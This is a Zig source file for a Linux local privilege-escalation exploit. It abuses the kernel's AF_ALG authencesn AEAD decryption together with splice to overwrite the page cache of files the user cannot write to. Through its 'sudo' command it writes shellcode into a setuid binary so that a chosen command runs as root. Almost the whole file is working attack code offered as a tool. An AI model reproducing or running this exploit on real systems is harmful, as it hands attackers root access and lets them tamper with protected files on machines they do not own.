const std = @import("std");
const l = std.os.linux;
const c = @import("c");
const shellcode = @import("shellcode");

pub fn main(init: std.process.Init.Minimal) !void {
    const gpa = std.heap.smp_allocator;
    var threaded_io = std.Io.Threaded.init(gpa, .{});
    defer threaded_io.deinit();
    const io = threaded_io.io();

    const args = parseArgs(init.args, gpa) catch |err| switch (err) {
        error.PrintHelp, error.NoCommand => return printHelp(),
        error.OutOfMemory => std.process.exit(1),
        else => |e| {
            std.log.err("Error: {t}", .{e});
            return printHelp();
        },
    };

    run(args, io) catch |err| {
        std.log.err("Error: {t}", .{err});
    };
}

fn run(args: ArgsConfig, io: std.Io) !void {
    switch (args.command) {
        .modify => |options| {
            const file = try std.Io.Dir.cwd()
                .openFile(io, options.path, .{});
            defer file.close(io);
            try writeBytes(file.handle, options.offset, options.data);
        },
        .run => |options| {
            const file = try std.Io.Dir.cwd()
                .openFile(io, options.path, .{});
            defer file.close(io);
            try writeBytes(file.handle, options.offset, options.data);

            var child = try std.process.spawn(io, .{
                .argv = options.argv,
            });
            _ = try child.wait(io);
            _ = l.fadvise(file.handle, 0, 0, l.POSIX_FADV.DONTNEED);
        },
        .sudo => |options| {
            const file = try std.Io.Dir.cwd()
                .openFile(io, options.argv[0], .{});
            defer file.close(io);
            try writeShellcode(file.handle, 0, shellcode.sudo);
            var child = try std.process.spawn(io, .{
                .argv = options.argv,
            });
            _ = try child.wait(io);
            _ = l.fadvise(file.handle, 0, 0, l.POSIX_FADV.DONTNEED);
        },
        .reset => {
            const file = try std.Io.Dir.cwd()
                .openFile(io, "test.txt", .{});
            defer file.close(io);
            _ = l.fadvise(file.handle, 0, 0, l.POSIX_FADV.DONTNEED);
        },
        .help => return printHelp(),
    }
}

const ArgsConfig = struct {
    command: union(enum) {
        run: struct {
            path: []const u8,
            offset: usize,
            data: []const u8,
            argv: []const []const u8,
        },
        modify: struct {
            path: []const u8,
            offset: usize,
            data: []const u8,
        },
        reset: struct {
            path: []const u8,
        },
        sudo: struct {
            argv: []const []const u8,
        },
        help: void,
    },
};

fn printHelp() void {
    std.debug.print(
        \\Usage:
        \\  run     <path> <data> [offset] [-- args...] - Write data to the executable at the given offset (default 0) and run it
        \\  sudo    <suid_path>   [command...]          - Runs a command as root by writing shellcode to a suid binary.
        \\                                                (the first argument of command must be the full path to program to run)
        \\  modify  <path> <data> [offset]              - Write data to the file at the given offset (default 0)
        \\  reset   <path>                              - Reset the file to its original state
        \\  help                                        - Show this message
        \\
    ,
        .{},
    );
}

fn parseArgs(args: std.process.Args, gpa: std.mem.Allocator) !ArgsConfig {
    var iter = args.iterate();
    if (!iter.skip()) return error.PrintHelp;

    const cmd_str = iter.next() orelse return error.NoCommand;
    const cmd = std.meta.stringToEnum(
        @typeInfo(@FieldType(ArgsConfig, "command")).@"union".tag_type.?,
        cmd_str,
    ) orelse return error.InvalidCommand;
    switch (cmd) {
        .run => {
            const path = iter.next() orelse return error.MissingPath;
            const data = iter.next() orelse return error.MissingData;

            var argv = std.ArrayList([]const u8).empty;
            defer argv.deinit(gpa);
            try argv.append(gpa, path);
            var args_coming = false;

            const offset = if (iter.next()) |offset_str| blk: {
                if (std.mem.eql(u8, offset_str, "--")) {
                    args_coming = true;
                    break :blk 0;
                }
                break :blk std.fmt.parseInt(usize, offset_str, 0) catch return error.InvalidOffsetNumber;
            } else 0;

            if (!args_coming) {
                args_coming = if (iter.next()) |args_sep|
                    std.mem.eql(u8, args_sep, "--")
                else
                    false;
            }

            if (args_coming) {
                while (iter.next()) |arg| try argv.append(gpa, arg);
            }

            return ArgsConfig{
                .command = .{
                    .run = .{
                        .path = path,
                        .offset = offset,
                        .data = data,
                        .argv = try argv.toOwnedSlice(gpa),
                    },
                },
            };
        },
        .sudo => {
            var argv = std.ArrayList([]const u8).empty;
            defer argv.deinit(gpa);
            while (iter.next()) |arg| try argv.append(gpa, arg);
            if (argv.items.len == 0) return error.MissingPath;
            return ArgsConfig{
                .command = .{
                    .sudo = .{
                        .argv = try argv.toOwnedSlice(gpa),
                    },
                },
            };
        },
        .modify => {
            const path = iter.next() orelse return error.MissingPath;
            const data = iter.next() orelse return error.MissingData;
            const offset = if (iter.next()) |offset_str|
                std.fmt.parseInt(usize, offset_str, 0) catch return error.InvalidOffsetNumber
            else
                0;
            return ArgsConfig{
                .command = .{
                    .modify = .{ .path = path, .offset = offset, .data = data },
                },
            };
        },
        .reset => {
            const path = iter.next() orelse return error.MissingPath;
            return ArgsConfig{
                .command = .{
                    .reset = .{ .path = path },
                },
            };
        },
        .help => return ArgsConfig{ .command = .help },
    }
}

const sys = struct {
    fn unexpected(err: l.E) error{Unexpected} {
        std.log.err("Unexpected Error: {t}", .{err});
        return error.Unexpected;
    }

    fn socket(domain: u32, type_: u32, protocol: u32) !l.fd_t {
        const res = l.socket(domain, type_, protocol);
        switch (l.errno(res)) {
            .SUCCESS => return @intCast(res),
            else => |e| return unexpected(e),
        }
    }

    fn bind(sock: l.fd_t, addr: *const l.sockaddr, addrlen: u32) !void {
        const res = l.bind(sock, @ptrCast(addr), addrlen);
        switch (l.errno(res)) {
            .SUCCESS => return,
            else => |e| return unexpected(e),
        }
    }

    fn setsockopt(sock: l.fd_t, level: i32, optname: u32, optval: ?*const u8, optlen: u32) !void {
        const res = l.syscall5(.setsockopt, @as(usize, @bitCast(@as(isize, sock))), @as(usize, @bitCast(@as(isize, level))), optname, @intFromPtr(optval), @as(usize, @intCast(optlen)));
        switch (l.errno(res)) {
            .SUCCESS => return,
            else => |e| return unexpected(e),
        }
    }

    fn accept(sock: l.fd_t) !l.fd_t {
        const res = l.accept4(sock, null, null, l.SOCK.CLOEXEC);
        switch (l.errno(res)) {
            .SUCCESS => return @intCast(res),
            else => |e| return unexpected(e),
        }
    }

    fn sendmsg(sock: l.fd_t, msg: *const l.msghdr_const, flags: u32) !void {
        const res = l.sendmsg(sock, @ptrCast(msg), flags);
        switch (l.errno(res)) {
            .SUCCESS => return,
            else => |e| return unexpected(e),
        }
    }

    fn pipe() ![2]l.fd_t {
        var pipefd: [2]l.fd_t = undefined;
        const res = l.pipe2(&pipefd, .{ .CLOEXEC = true });
        switch (l.errno(res)) {
            .SUCCESS => return pipefd,
            else => |e| return unexpected(e),
        }
    }

    fn splice(fd_in: l.fd_t, off_in: ?i64, fd_out: l.fd_t, off_out: ?i64, len: usize, flags: u32) !void {
        const res = l.syscall6(
            l.SYS.splice,
            @as(usize, @bitCast(@as(isize, fd_in))),
            if (off_in) |*off| @intFromPtr(off) else 0,
            @as(usize, @bitCast(@as(isize, fd_out))),
            if (off_out) |*off| @intFromPtr(off) else 0,
            len,
            flags,
        );
        switch (l.errno(res)) {
            .SUCCESS => {},
            else => |e| return unexpected(e),
        }
    }

    fn recv(sock: l.fd_t, buf: []u8) !usize {
        const res = l.recvfrom(
            sock,
            buf.ptr,
            buf.len,
            0,
            null,
            null,
        );
        switch (l.errno(res)) {
            .SUCCESS => return @intCast(res),
            .BADMSG => return error.BadMessage,
            else => |e| return unexpected(e),
        }
    }

    const cmsg_align = std.mem.Alignment.of(usize);

    fn CMSG_LEN(length: u32) u32 {
        return @as(u32, @intCast(cmsg_align.forward(@sizeOf(l.cmsghdr)))) + length;
    }
    fn CMSG_DATA(cmsg: *l.cmsghdr, T: type) T {
        return @ptrFromInt(@intFromPtr(cmsg) +
            cmsg_align.forward(@sizeOf(l.cmsghdr)));
    }
    fn CMSG_NEXT(cmsg: *l.cmsghdr, length: u32) *l.cmsghdr {
        const ptr = @intFromPtr(cmsg);
        return @ptrFromInt(ptr + sys.CMSG_SPACE(length));
    }
    fn CMSG_SPACE(length: u32) u32 {
        return @intCast(cmsg_align.forward(@sizeOf(l.cmsghdr)) + cmsg_align.forward(length));
    }
};

fn initSocket() !l.fd_t {
    const sock = try sys.socket(l.AF.ALG, l.SOCK.SEQPACKET | l.SOCK.CLOEXEC, l.IPPROTO.IP);
    errdefer _ = l.close(sock);

    var sa = c.sockaddr_alg{
        .salg_family = l.AF.ALG,
    };
    const alg_type = "aead";
    const alg_name = "authencesn(hmac(sha256),cbc(aes))";
    @memcpy(sa.salg_type[0..alg_type.len], alg_type);
    @memcpy(sa.salg_name[0..alg_name.len], alg_name);

    try sys.bind(sock, @ptrCast(&sa), @sizeOf(c.sockaddr_alg));

    const key = [_]u8{ 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10 } ++ .{0} ** 32;
    try sys.setsockopt(
        sock,
        l.SOL.ALG,
        c.ALG_SET_KEY,
        @ptrCast(&key),
        @sizeOf(@TypeOf(key)),
    );

    const authsize: u32 = 4;
    try sys.setsockopt(
        sock,
        l.SOL.ALG,
        c.ALG_SET_AEAD_AUTHSIZE,
        null,
        @intCast(authsize),
    );

    return sock;
}

fn setupAEAD(sock: l.fd_t, value: u32) !l.fd_t {
    const u = try sys.accept(sock);
    errdefer _ = l.close(u);

    const data: [8]u8 = @bitCast([2]u32{ @bitCast([1]u8{'A'} ** 4), value });
    const op: u32 = c.ALG_OP_DECRYPT;
    const ivdata: [20]u8 = .{0x10} ++ .{0} ** 19;
    const assoclen: u32 = 8;
    const iovec = std.posix.iovec_const{
        .base = @ptrCast(&data),
        .len = @sizeOf(@TypeOf(data)),
    };

    var cbuf: [
        sys.CMSG_SPACE(@sizeOf(u32)) +
            sys.CMSG_SPACE(@sizeOf(@TypeOf(ivdata))) +
            sys.CMSG_SPACE(@sizeOf(u32))
    ]u8 align(@alignOf(usize)) = undefined;
    const msg = l.msghdr_const{
        .control = @ptrCast(&cbuf),
        .controllen = @sizeOf(@TypeOf(cbuf)),
        .iov = @ptrCast(&iovec),
        .iovlen = 1,
        .name = null,
        .namelen = 0,
        .flags = 0,
    };

    var cmsg: *l.cmsghdr = @ptrCast(@alignCast(&cbuf));
    cmsg.level = l.SOL.ALG;
    cmsg.type = c.ALG_SET_OP;
    cmsg.len = sys.CMSG_LEN(@sizeOf(u32));
    sys.CMSG_DATA(cmsg, *u32).* = op;

    cmsg = sys.CMSG_NEXT(cmsg, @sizeOf(u32));
    cmsg.level = l.SOL.ALG;
    cmsg.type = c.ALG_SET_IV;
    cmsg.len = sys.CMSG_LEN(@sizeOf(@TypeOf(ivdata)));
    sys.CMSG_DATA(cmsg, *[20]u8).* = ivdata;

    cmsg = sys.CMSG_NEXT(cmsg, @sizeOf(@TypeOf(ivdata)));
    cmsg.level = l.SOL.ALG;
    cmsg.type = c.ALG_SET_AEAD_ASSOCLEN;
    cmsg.len = sys.CMSG_LEN(@sizeOf(u32));
    sys.CMSG_DATA(cmsg, *u32).* = assoclen;

    try sys.sendmsg(u, &msg, l.MSG.MORE);
    return u;
}

fn writeDWORD(file: l.fd_t, offset: usize, value: u32) !void {
    const sock = try initSocket();
    defer _ = l.close(sock);
    const u = try setupAEAD(sock, value);
    defer _ = l.close(u);
    const read, const write = try sys.pipe();
    defer _ = l.close(read);
    defer _ = l.close(write);
    try sys.splice(
        file,
        0,
        write,
        null,
        offset + 4,
        0,
    );
    try sys.splice(
        read,
        null,
        u,
        null,
        offset + 4,
        0,
    );
    var buf: [1024]u8 = undefined;
    var toRecieve = offset + 8;
    while (toRecieve > 0) {
        const slice = buf[0..@min(buf.len, toRecieve)];
        const n = sys.recv(u, slice) catch |e| switch (e) {
            error.BadMessage => break,
            else => return e,
        };
        if (n == 0) break;
        toRecieve -= n;
    }
}

fn writeBytes(file: l.fd_t, offset: usize, data: []const u8) !void {
    var i: usize = 0;
    while (i < data.len) : (i += 4) {
        const chunk = data[i..@min(i + 4, data.len)];
        if (chunk.len != 4) break;
        try writeDWORD(file, offset + i, @bitCast(chunk[0..4].*));
    }
    const rest = data[i..];
    if (rest.len == 0) return;
    var last_chunk: [4]u8 = undefined;
    @memcpy(last_chunk[0..rest.len], rest);

    const needed_buffer = last_chunk[rest.len..];
    const res = l.pread(file, needed_buffer.ptr, needed_buffer.len, @intCast(offset + data.len));
    switch (l.errno(res)) {
        .SUCCESS => {},
        else => |e| return sys.unexpected(e),
    }
    try writeDWORD(file, offset + i, @bitCast(last_chunk));
}

fn writeShellcode(file: l.fd_t, offset: usize, code: []const u8) !void {
    if (!shellcode.is_compressed) return writeBytes(file, offset, code);

    var off = offset;

    var reader = std.Io.Reader.fixed(code);
    var buffer: [std.compress.flate.max_window_len]u8 = undefined;
    var flate = std.compress.flate.Decompress.init(&reader, .gzip, &buffer);
    var out_buffer: [1024]u8 = undefined;
    while (flate.reader.readSliceShort(&out_buffer)) |len| {
        if (len == 0) break;
        try writeBytes(file, off, out_buffer[0..len]);
        off += len;
    } else |err| return err;
}
